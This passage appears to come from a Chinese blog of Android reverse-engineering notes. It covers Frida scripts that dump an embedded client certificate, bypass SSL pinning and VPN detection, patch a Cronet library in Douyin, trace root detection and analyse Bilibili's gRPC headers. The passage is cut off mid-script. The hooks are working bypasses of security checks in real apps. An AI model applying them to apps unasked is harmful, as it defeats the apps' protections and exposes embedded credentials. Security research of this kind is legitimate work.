class="line">&lt;libbreakpad.so&gt; <span class="function"><span class="params">method_name</span> =&gt;</span> java.security.KeyStore com.wormpex.sdk.errors.CrashHandler.getKeyStore() ,<span class="built_in">offset</span>=&gt; <span class="number">0x6f58</span> ,module_name=&gt; libbreakpad.so</span><br></pre></td></tr></table></figure><p>kali中  <code>file * |grep xxx 可以看文件格式</code></p><p>IDA加载这个so，然后找到这个方法如下<img src="assets/image-20241026223229388.png" alt="image-20241026223229388"></p><p><img src="assets/image-20241026230824453.png" alt="image-20241026230824453">发现一些sub_7b7c()函数，数据经过这个函数变成了一个类路径，所以这个方法应该就是还原包路径的。</p><p>对其进行hook</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params">module_name, fun</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> dlopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line">    <span class="comment">//console.log(dlopen);</span></span><br><span class="line">    <span class="keyword">if</span>(dlopen != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(dlopen,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">if</span>(pathptr)&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">path</span>=(pathptr).<span class="title function_">readCString</span>();</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">path</span>.<span class="title function_">indexOf</span>(module_name) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//console.log(soName);</span></span><br><span class="line">                </span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>)</span><br><span class="line">                    <span class="title function_">fun</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新版本hook dlopen</span></span><br><span class="line">    <span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line">    <span class="comment">//console.log(android_dlopen_ext);</span></span><br><span class="line">    <span class="keyword">if</span>(android_dlopen_ext != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(android_dlopen_ext,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">if</span>(pathptr)&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">path</span>=<span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">path</span>.<span class="title function_">indexOf</span>(module_name) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//console.log(soName);</span></span><br><span class="line">                </span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>)</span><br><span class="line">                    <span class="title function_">fun</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hook_dlopen</span>(<span class="string">&quot;libbreakpad.so&quot;</span>,hook1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> s0_base=<span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libbreakpad.so&quot;</span>);</span><br><span class="line">    <span class="comment">//console.log(s0_base);</span></span><br><span class="line">    <span class="keyword">var</span> base=s0_base.<span class="title function_">add</span>(<span class="number">0x7b7c</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(base,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;entering 7b7c...&quot;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;leaving 7b7c:&quot;</span>,retval,retval.<span class="title function_">readCString</span>())</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p>打印信息部分如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">entering</span> <span class="number">7</span>b7c...</span><br><span class="line"><span class="attribute">leaving</span> <span class="number">7</span>b7c: <span class="number">0</span>x74302a8390 (Ljava/lang/String;)Ljava/security/KeyStore;</span><br><span class="line"><span class="attribute">entering</span> <span class="number">7</span>b7c...</span><br><span class="line"><span class="attribute">leaving</span> <span class="number">7</span>b7c: <span class="number">0</span>x739a9a6598 PKCS12</span><br><span class="line"><span class="attribute">entering</span> <span class="number">7</span>b7c...</span><br><span class="line"><span class="attribute">leaving</span> <span class="number">7</span>b7c: <span class="number">0</span>x733f2bf1e0 android/util/Base64</span><br><span class="line"><span class="attribute">entering</span> <span class="number">7</span>b7c...</span><br><span class="line"><span class="attribute">leaving</span> <span class="number">7</span>b7c: <span class="number">0</span>x7430183b70 decode</span><br><span class="line"><span class="attribute">entering</span> <span class="number">7</span>b7c...</span><br><span class="line"><span class="attribute">leaving</span> <span class="number">7</span>b7c: <span class="number">0</span>x739b36ae00 (Ljava/lang/String;I)[B</span><br><span class="line"><span class="attribute">entering</span> <span class="number">7</span>b7c...</span><br><span class="line"><span class="attribute">leaving</span> <span class="number">7</span>b7c: <span class="number">0</span>x739a9a6598 blibee</span><br></pre></td></tr></table></figure><p>发现有base，还有一些jni的签名，可以猜测对数据进行base解码，然后拿去做证书校验，</p><p>写个脚本base64解码就好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hookBase64decide</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.use(<span class="string">&quot;android.util.Base64&quot;</span>).decode.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation=function(str,i)&#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">ByteString</span> <span class="operator">=</span> Java.use(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> result=<span class="built_in">this</span>.decode(str,i);</span><br><span class="line">            console.log(<span class="string">&quot;args[0]==&gt;&quot;</span>,str)</span><br><span class="line">            console.log(<span class="string">&quot;args[1]==&gt;&quot;</span>,i)</span><br><span class="line">            console.log(<span class="string">&quot;retval==&gt;&quot;</span>,ByteString.of(result).hex());</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.decode(str,i);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">setImmediate(hookBase64decide);</span><br></pre></td></tr></table></figure><p>然后把16进制结果通过010导入改后缀为p12即可，最后成功抓包</p><h4 id="案例：油天下">案例：<strong>油天下</strong></h4><p><a href="https://www.bilibili.com/video/BV14o4y1P7LU/?spm_id_from=333.788.top_right_bar_window_history.content.click&amp;vd_source=090d53370728f876a65a8b2e59916fe5">SSLpinning解绑定两个案例：混淆、Flutter解绑定_哔哩哔哩_bilibili</a></p><p>登录界面抓包<img src="assets/image-20241027200345853.png" alt="image-20241027200345853"></p><p>发现客户端校验服务端</p><p>通过一些开源框架发现抓不到包。r0capture也找不到</p><p>如果r0capture也抓不到，说明收发包用的第三方库。例如flutter，这道题就是flutter开发的</p><p>如果lib、下有libflutter则是flutter开发的，当然我们也可以看代码是不是flutter所开发</p><p>反编译这个app，找到main函数，发现如下位置<img src="assets/image-20241027224731960.png" alt="image-20241027224731960"></p><p>也可以确定确实有flutter的成分在里面。</p><p>对于flutter开发实现的收发包网上也有开源的项目使用</p><p><a href="https://github.com/horangi-cyops/flutter-ssl-pinning-bypass">https://github.com/horangi-cyops/flutter-ssl-pinning-bypass</a></p><p>[<a href="https://bbs.kanxue.com/thread-261941.htm">原创]一种基于frida和drony的针对flutter抓包的方法-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><p>对于不同arm架构需要做稍微的修改，如pattern和armversion需要进行修改。</p><p>参考<a href="https://www.bilibili.com/video/BV14o4y1P7LU/?spm_id_from=333.880.my_history.page.click">SSLpinning解绑定两个案例：混淆、Flutter解绑定_哔哩哔哩_bilibili</a></p><p>上述项目可以成功绕过，但是我的不行，怀疑版本更新或者有其他检测。、</p><h2 id="Cronet抓包">Cronet抓包</h2><p><strong>案例：抖音26.1</strong></p><p>[<a href="https://bbs.kanxue.com/thread-277996.htm">原创] 更高更妙的抓包——从Chrome源码学习使用Cronet 通讯组件的app的通用抓包方法-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><p>通过对文章的阅读和对谷歌网络通讯的源码，发现关键点就是hook MapCertStatusToNetError 函数的返回值。</p><p>然后根据源码中相邻的函数，编译后也相邻，然后通过关键字符串来索引定位。</p><p>相邻函数字符串 ==》 Verify ==》MapCertStatusToNetError ==》修改返回值</p><ul><li><p>定位字符串<img src="assets/image-20241106140417055.png" alt="image-20241106140417055"></p><p><img src="assets/image-20241106140950542.png" alt="image-20241106140950542"></p></li><li><p>查找与他相邻的函数，寻找Verify<img src="assets/image-20241106141405686.png" alt="image-20241106141405686"></p></li></ul><p>​发现与源码中rv=MapCertStatusToNetError()结构相似，所以来到了Verif函数中</p><ul><li><p>进入sub_31FF58进行修改。<img src="assets/image-20241106141758146.png" alt="image-20241106141758146"></p></li><li><p>把修改后的这个so文件放到手机中/data/app/package_name/lib/arm64/下<img src="assets/image-20241106142855267.png" alt="image-20241106142855267"></p></li><li><p>抓包成功</p></li></ul><h2 id="玩转app">玩转app</h2><p>案例：玩转app1.0.8</p><p>打开vpn抓包，发现有检测<br><img src="assets/image-20241107221013901.png" alt="image-20241107221013901"></p><p>是个弹窗，且有个点击按钮，所以hook onclick来定位关键代码：</p><p>定位：<code>[Pixel XL::玩转]-&gt; [WatchEvent] onClick: com.stupid.common.view.popup.ConfirmCancelCenterPopupView</code></p><p>根据这个关键类名，来索引这个关键类在哪个dex中(用frida-dexdump脱壳)，然后拖入jadx</p><p>搜索关键字：<img src="assets/image-20241107221407317.png" alt="image-20241107221407317"></p><p>所以可以改变z的值即可，向上翻翻可以找到如下：<img src="assets/image-20241107221747806.png" alt="image-20241107221747806"></p><p>发现<code>tun0</code>:</p><p>当开启vpn时，getName获得网络设备名称=<strong>tun0</strong> 主要检测java.net.NetworkInterface.getName</p><p>正是对vpn的一个典型检测点，所以hook，绕过如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">vpn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> networkInterface=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.NetworkInterface&quot;</span>);</span><br><span class="line">        networkInterface.<span class="property">getName</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> name = <span class="variable language_">this</span>.<span class="title function_">getName</span>();  <span class="comment">//hook java层的getName方法</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;name: &quot;</span> + name);</span><br><span class="line">            <span class="keyword">if</span> (name === <span class="string">&quot;tun0&quot;</span> || name === <span class="string">&quot;ppp0&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;rmnet_data0&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> name;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_">setImmediate</span>(vpn);</span><br></pre></td></tr></table></figure><p>点击注册玩转：有检测<strong>root</strong>：</p><p>根据参考：没有硬编码字符串写在代码中，通过hook <code>toString</code>方法打印结果来定位</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">StringBuild</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.StringBuilder&quot;</span>);</span><br><span class="line">        <span class="title class_">StringBuild</span>.<span class="property">toString</span>.<span class="property">implementation</span> =<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">if</span> (result.<span class="title function_">indexOf</span>(<span class="string">&quot;the phone is root&quot;</span>)!=-<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;stack&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//console.log(&quot;StringBuild&quot;,result);</span></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中有个调用栈有如下：<img src="assets/image-20241107231004925.png" alt="image-20241107231004925"></p><p>我们可以hook他的result来验证是不是输出了<code>phone is root</code>，</p><h2 id="哔哩哔哩视频和字幕接口分析-复现">哔哩哔哩视频和字幕接口分析(复现)</h2><p><strong>参考复现文章</strong>：<a href="https://blog.seeflower.dev/archives/4/">https://blog.seeflower.dev/archives/4/</a></p><p>**app：**bilibili v6.7.0</p><p>首先对app的视频和字幕进行抓包，打开抓包工具，然后打开一个视频抓包(开弹幕)</p><h3 id="抓包内容："><strong>抓包内容：</strong></h3><h4 id="视频接口请求："><strong>视频接口请求</strong>：</h4><p><img src="assets/image-20241208132702237.png" alt="image-20241208132702237"></p><p><img src="assets/image-20241208132851950.png" alt="image-20241208132851950"></p><h4 id="弹幕接口请求"><strong>弹幕接口请求</strong></h4><p><img src="assets/image-20241208132758376.png" alt="image-20241208132758376"></p><p><img src="assets/image-20241208132916987.png" alt="image-20241208132916987"></p><h3 id="请求定位">请求定位</h3><p>通过观察上面抓到的包，发现content-type是<code>application/grpc</code>，可能使用了grpc库，jadx定位一下，发现确实是使用了grpc</p><p><strong>gRPC 库的核心功能</strong></p><ul><li><strong>客户端和服务端代码生成</strong>：通过定义 <code>.proto</code> 文件，gRPC 会生成客户端和服务端的代码。客户端使用这些代码调用远程服务，服务端实现这些代码来处理请求。</li><li><strong>通信协议</strong>：gRPC 基于 HTTP/2 协议，支持多路复用、流量控制、请求/响应头压缩等特性，提高了效率。</li><li><strong>序列化与反序列化</strong>：gRPC 默认使用 <strong>Protocol Buffers (Protobuf)</strong> 作为消息格式，它用于将消息结构化（序列化）为二进制数据传输，同时也支持其他格式（如 JSON）。</li><li><strong>双向流支持</strong>：gRPC 支持双向流通信，客户端和服务端可以在同一连接上相互传输数据。</li></ul><h3 id="请求头定位">请求头定位</h3><p><strong>从拦截器角度入手</strong></p><p>grpc实现源码：<a href="https://github.com/grpc/grpc-java/">https://github.com/grpc/grpc-java/</a></p><p>在这里可以找到一个<a href="https://github.com/grpc/grpc-java/blob/master/examples/src/main/java/io/grpc/examples/header/HeaderClientInterceptor.java">HeaderClientInterceptor.java</a>，这个类实现了 <code>ClientInterceptor</code> 接口，<code>ClientInterceptor</code> 是 gRPC 客户端调用的一个拦截器，用于拦截和修改客户端发出的 gRPC 请求。，通过抓包知道请求头参数比较多，可能通过拦截器来自定义了一些请求头参数。</p><p>jadx搜索一下这个拦截器，通过搜索ClientInterceptor<img src="assets/image-20241208144329302.png" alt="image-20241208144329302"></p><p>搜索结果如下<img src="assets/image-20241208145157795.png" alt="image-20241208145157795"></p><p>通过进入每个方法，发现<code>b.edc</code>和<code>b.edf</code>中存在请求头参数<img src="assets/image-20241208145555560.png" alt="image-20241208145555560"></p><p><strong>解析kotlin的Metadata</strong></p><p><a href="https://juejin.cn/post/6844903599865069582">https://juejin.cn/post/6844903599865069582</a></p><p><img src="assets/image-20241209213206099.png" alt="image-20241209213206099"></p><p>通过搜索引擎了解：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在 jadx-gui 反编译 APK 文件时，如果你看到 <span class="meta">@Metadata</span> 出现，这通常与 Kotlin 相关，尤其是 Kotlin 编译器为生成的字节码添加的元数据注解。</span><br><span class="line">在 Kotlin 中，<span class="meta">@Metadata</span> 是一个内部注解，它用于向编译器提供有关类、函数、属性、文件等的附加信息。这个注解并不直接影响运行时的行为，但它对于 Kotlin 编译器和工具链（如反编译工具、Kotlin 编译器本身等）非常重要，用于帮助恢复源代码结构。通过这些信息可以更好地理解 Kotlin 代码的结构，并生成更接近原始代码的 Java 代码。</span><br></pre></td></tr></table></figure><p>分析metadata注解信息：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Metadata(bv = &#123;1, 0, 3&#125;, </span><br><span class="line">d1 = &#123;略&#125;, </span><br><span class="line">d2 = &#123;<span class="string">&quot;Lcom/bilibili/lib/moss/internal/impl/grpc/interceptor/CommonInterceptor;&quot;</span>, <span class="string">&quot;Lio/grpc/ClientInterceptor;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="string">&quot;KEY_AUTH&quot;</span>, <span class="string">&quot;Lio/grpc/Metadata$Key;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;kotlin.jvm.PlatformType&quot;</span>, <span class="string">&quot;KEY_DEVICE&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;KEY_LOCALE&quot;</span>, <span class="string">&quot;KEY_METADATA&quot;</span>, <span class="string">&quot;KEY_NETWORK&quot;</span>, <span class="string">&quot;KEY_RESTRICTION&quot;</span>, <span class="string">&quot;addCommonHeader&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;Lio/grpc/Metadata;&quot;</span>, <span class="string">&quot;interceptCall&quot;</span>, <span class="string">&quot;Lio/grpc/ClientCall;&quot;</span>, <span class="string">&quot;ReqT&quot;</span>, <span class="string">&quot;RespT&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;Lio/grpc/MethodDescriptor;&quot;</span>, <span class="string">&quot;callOptions&quot;</span>, <span class="string">&quot;Lio/grpc/CallOptions;&quot;</span>, <span class="string">&quot;next&quot;</span>, <span class="string">&quot;Lio/grpc/Channel;&quot;</span>, <span class="string">&quot;moss_release&quot;</span>&#125;, </span><br><span class="line">k = 1, </span><br><span class="line">mv = &#123;1, 1, 15&#125;)</span><br><span class="line"></span><br><span class="line">bytecode版本是1.0.3</span><br><span class="line">d1和d2表示Kotlin 文件的二进制结构，包含了类的详细信息。</span><br><span class="line">k表示类的类型，1表示类，2表示接口</span><br><span class="line">m表示Kotlin版本为1.1.15</span><br><span class="line"></span><br><span class="line">根据上面的d2和官方文档函数InterceptCall的构成 (返回值 名字 参数) ==》 d2=&#123;方法名，返回类型，参数名，参数类型&#125;</span><br></pre></td></tr></table></figure><p>只能看个大概，通过动态分析Metadata</p><p>可以选择使用objection的wallbreaker插件来进行类对象的dump来看看内部构造及值，但是我的测试机每次使用objectionsearch就崩溃…这里就用一下作者的原图</p><p><img src="assets/Snipaste_2020-10-04_22-28-10.png" alt="b.edc实例信息"></p><p>结合grpc<a href="https://grpc.github.io/grpc-java/javadoc/io/grpc/ClientInterceptor.html">官网文档</a>和dump的实例信息和Metadata的d2元数据进行推测：</p><p>上面那些有请求头参数的变量就是d2中的<code>KEY_XXX</code></p><p>根据函数名和参数类型：</p><p><code>io.grpc.f a(io.grpc.MethodDescriptor, io.grpc.d, io.grpc.e);</code>就是```interceptCall``</p><p><code>void a(io.grpc.ai)</code>就是<code>addCommonHeader</code></p><p>d2中数据拼接组成后 大致如下</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CommonInterceptor <span class="keyword">implements</span> ClientInterceptor</span><br><span class="line"><span class="keyword">void</span> addCommonHeader(io<span class="regexp">/grpc/M</span>etadata headers)</span><br><span class="line">&lt;ReqT,RespT&gt;io<span class="regexp">/grpc/</span>ClientCall interceptCall(io<span class="regexp">/grpc/M</span>ethodDescriptor method,io<span class="regexp">/grpc/</span>CallOptions callOptions,io<span class="regexp">/grpc/</span>Channel <span class="keyword">next</span>)</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> io<span class="regexp">/grpc/M</span>etadata$Key KEY_AUTH</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> kotlin.jvm.PlatformType KEY_DEVICE</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="string">&quot;KEY_LOCALE&quot;</span>, <span class="string">&quot;KEY_METADATA&quot;</span>, <span class="string">&quot;KEY_NETWORK&quot;</span>, <span class="string">&quot;KEY_RESTRICTION&quot;</span></span><br></pre></td></tr></table></figure><h3 id="addCommonHeader分析">addCommonHeader分析</h3><p>分析到这里 对于这个拦截器函数有了大概了解，对于请求头参数的添加主要是在addCommonHeader进行，</p><p>所以hook这个函数看一下调用栈溯源一下</p><p><code>android hooking watch class_method b.edc.a --dump-args --dump-backtrace --dump-return</code></p><p>然后点击视频，进行触发。调用了四次这个地方</p><ul><li><img src="assets/image-20241210190222527.png" alt="image-20241210190222527"></li><li><img src="assets/image-20241210190250621.png" alt="image-20241210190250621"></li><li><img src="assets/image-20241210190313949.png" alt="image-20241210190313949"></li><li><img src="assets/image-20241210190356018.png" alt="image-20241210190356018"></li></ul><p>确定了addcommonHeader函数，看一看他的内容</p><p><img src="assets/image-20241210191419727.png" alt="image-20241210191419727"></p><p>主要就是再调用aiVar.a方法，并且用了六个和前面的6个请求头对照上了，hook一下他</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> ai = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;io.grpc.ai&quot;</span>);</span><br><span class="line">        ai[<span class="string">&quot;a&quot;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;io.grpc.ai$e&#x27;</span>, <span class="string">&#x27;java.lang.Object&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">eVar, t</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`aiVar.a is called: args0=<span class="subst">$&#123;eVar&#125;</span>, <span class="subst">$&#123;t&#125;</span>`</span>);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="string">&quot;a&quot;</span>](eVar, t);</span><br><span class="line">&#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">Pixel</span> <span class="attr">XL</span>::哔哩哔哩]-&gt; </span><br><span class="line">aiVar.<span 